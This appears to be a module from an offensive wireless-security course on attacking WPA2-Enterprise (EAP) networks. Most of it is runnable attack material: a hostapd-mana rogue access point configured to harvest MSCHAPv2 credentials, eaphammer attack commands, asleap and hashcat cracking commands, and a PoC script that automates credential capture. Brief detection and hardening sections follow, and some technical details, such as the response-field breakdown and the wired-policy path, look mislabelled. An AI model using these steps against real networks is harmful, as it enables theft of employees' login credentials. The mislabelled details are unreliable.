# Module 02 — EAP Attacks

## 2.1 Rogue AP with hostapd-mana

### Installation

```bash
# Clone and build
git clone https://github.com/sensepost/hostapd-mana.git
cd hostapd-mana
make

# Install
sudo make install
```

### Configuration

```bash
# /etc/hostapd-mana/mana.conf
interface=wlan0
ssid=CorporateWiFi
channel=6

# WPA2-Enterprise
wpa=2
wpa_key_mgmt=WPA-EAP
auth_algs=3

# Rogue RADIUS
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-mana/mana.eap_user
ca_cert=/etc/hostapd-mana/ca.pem
server_cert=/etc/hostapd-mana/server.pem
private_key=/etc/hostapd-mana/server.key

# Credential capture
mana_wpe=1
mana_credout=/var/log/mana-creds.txt
```

### EAP User File

```
# /etc/hostapd-mana/mana.eap_user
# Accept any identity, request MSCHAPv2
"*"     mschapv2,ttls,peap
```

### Execution

```bash
# Start rogue AP
sudo hostapd-mana /etc/hostapd-mana/mana.conf

# Monitor credential capture
tail -f /var/log/mana-creds.txt

# Expected output:
# username:DOMAIN\\user
# challenge:00:11:22:33:44:55:66:77
# response:aa:bb:cc:dd:ee:ff:00:11:22:33:44:55:66:77:88:99:aa:bb:cc:dd:ee:ff:00:11
```

---

## 2.2 EAPHammer

### Installation

```bash
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer
./kali-setup
```

### Quick Start

```bash
# Full attack (rogue AP + Responder + PMKID)
sudo ./eaphammer -i wlan0 --bssid 00:11:22:33:44:55 --essid CorpWiFi --channel 6 --auth peap --creds

# With captive portal
sudo ./eaphammer -i wlan0 --bssid 00:11:22:33:44:55 --essid CorpWiFi --channel 6 --auth peap --creds --hostapd-debug 2

# Extract captured creds
cat loot/0000/looted-credentials.txt
```

---

## 2.3 MSCHAPv2 Cracking

### Challenge/Response Format

```
Captured Data:
- Username: CORP\\jdoe
- Challenge: 0123456789abcdef
- Response: [24 bytes]
  - 16 bytes: NTProofStr
  - 8 bytes: NTResponse
```

### asleap Usage

```bash
# Install
sudo apt install asleap

# Crack with wordlist
asleap -C 0123456789abcdef -R response_hash -W wordlist.txt

# Options:
# -C = Challenge (16 hex chars)
# -R = Response (48 hex chars)
# -W = Wordlist
# -v = Verbose
```

### hashcat Mode 5500

```bash
# Format: user::domain:challenge:response
hashcat -a 3 -m 5500 'jdoe::CORP:0123456789abcdef:response_hash' wordlist.txt
```

---

## 2.4 Detection: Rogue AP Identification

### Kismet Detection

```bash
# Alert on rogue APs
kismet -c wlan0mon

# Check for:
# - Duplicate BSSIDs
# - Certificate fingerprint changes
# - Signal strength anomalies
```

### Certificate Monitoring

```bash
# Extract AP certificate fingerprint
tshark -r capture.pcap -Y "ssl.handshake.certificate" -T fields -e x509af.sha1_fingerprint

# Compare against known good
```

---

## 2.5 Defense: Preventing EAP Attacks

### Client Hardening

```
Windows Group Policy:
- Computer Config > Policies > Windows Settings > Security Settings > 
  Wired Network (IEEE 802.3) Policies
- Define policy: PEAP with certificate validation
- Trusted root CAs: Only corporate CA
- Do not prompt user to authorize new servers: ENABLED
```

### Server Certificate Pinning

```
Certificate Pinning Hash:
Subject: CN=radius.corp.com
SHA256: a1b2c3d4e5f6...

Client config must match exact pin
```

---

## 2.6 PoC: Automated EAP Credential Capture

```bash
#!/bin/bash
# eap-capture.sh

BSSID=$1
ESSID=$2
CHANNEL=$3

sudo hostapd-mana /etc/hostapd-mana/mana.conf &
HOSTAPD_PID=$!

echo "[+] Rogue AP started: $ESSID"
echo "[+] Monitoring credentials..."

tail -f /var/log/mana-creds.txt | while read line; do
    if echo "$line" | grep -q "username:"; then
        echo "[+] CREDENTIAL CAPTURED:"
        echo "$line"
    fi
done

kill $HOSTAPD_PID
```

---

**Next**: [Module 03 — Evil Twin Attacks](03-evil-twin.md)
